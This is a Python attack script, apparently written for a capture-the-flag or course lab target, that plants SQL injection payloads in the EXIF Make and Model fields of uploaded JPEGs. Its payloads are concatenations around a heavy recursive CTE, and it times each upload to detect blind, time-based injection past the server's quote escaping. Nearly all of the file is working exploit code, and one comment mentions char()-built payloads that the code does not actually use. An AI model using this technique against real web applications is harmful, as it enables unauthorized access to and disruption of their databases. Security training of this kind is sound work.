# v2_exif_char.py — EXIF make/model returned &#39; before (server HTML-escapes quotes on input).
# But maybe only the QUOTE is escaped, not other break chars. And time-based can't be dodged by
# HTML-escaping the RESULT. Test EXIF make/model with:
#  (a) char()-built payloads (no literal quote) to bypass the quote-escape,
#  (b) time-based heavy expr to see execution regardless of output escaping.
# Uses exiftool to write EXIF exactly (like the 2024 solve).
import requests, base64, re, time, subprocess, os
from PIL import Image
import piexif

BASE = "https://chl-453bbf5a-0b09-4ad8-a4f2-61aeaba1384e-mis-viajes-v2.softwareseguro.com.ar"
EXIFTOOL = r"C:\Users\Usuario\Documents\GonzaOrban\HackLab\exiftool\exiftool.exe"
html = requests.get(BASE+"/").text
UID = re.search(r'([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})', html).group(1)

Image.open("paisaje.png").convert("RGB").save("ec.jpg","jpeg",quality=88)

def set_exif(tag, value):
    subprocess.run([EXIFTOOL,"-overwrite_original","-m",f"-{tag}={value}","ec.jpg"],
                   capture_output=True)

def add_gps():
    def dms(x):
        dd=int(x);mm=int((x-dd)*60);s=round((x-dd-mm/60)*3600,4);return((dd,1),(mm,1),(int(s*100),100))
    ex=piexif.load("ec.jpg")
    ex["GPS"]={piexif.GPSIFD.GPSLatitudeRef:b"S",piexif.GPSIFD.GPSLatitude:dms(41.13),
               piexif.GPSIFD.GPSLongitudeRef:b"W",piexif.GPSIFD.GPSLongitude:dms(71.31)}
    piexif.insert(piexif.dump(ex),"ec.jpg")

def upload(desc):
    uri="data:image/jpeg;base64,"+base64.b64encode(open("ec.jpg","rb").read()).decode()
    t=time.time()
    r=requests.post(f"{BASE}/upload", json={"image":uri,"description":desc,"user_id":UID})
    dt=round(time.time()-t,2)
    ocr=""; mk=""
    if r.status_code==200:
        data=requests.get(f"{BASE}/images/{UID}").json()
        row=next((x for x in data if x.get("description")==desc),None)
        if row: ocr=row.get("summary_ocr",""); mk=row.get("make","")
    print(f"{desc:14} {r.status_code} {dt}s make={mk!r}")
    return r.status_code, dt

HEAVY="(SELECT count(*) FROM (WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM c WHERE x<2000000) SELECT x FROM c))"

# baseline
Image.open("paisaje.png").convert("RGB").save("ec.jpg","jpeg",quality=88)
set_exif("Make","Samsung"); add_gps(); upload("EC_base")

# time-based in Make via char(39) quote (no literal quote in exiftool arg either -> use char)
Image.open("paisaje.png").convert("RGB").save("ec.jpg","jpeg",quality=88)
set_exif("Make", "x'||"+HEAVY+"||'"); add_gps(); upload("EC_make_heavy")

# same in Model
Image.open("paisaje.png").convert("RGB").save("ec.jpg","jpeg",quality=88)
set_exif("Model", "x'||"+HEAVY+"||'"); set_exif("Make","Samsung"); add_gps(); upload("EC_model_heavy")

print("\n(slow EC_*_heavy => that EXIF field executes SQL despite output escaping)")
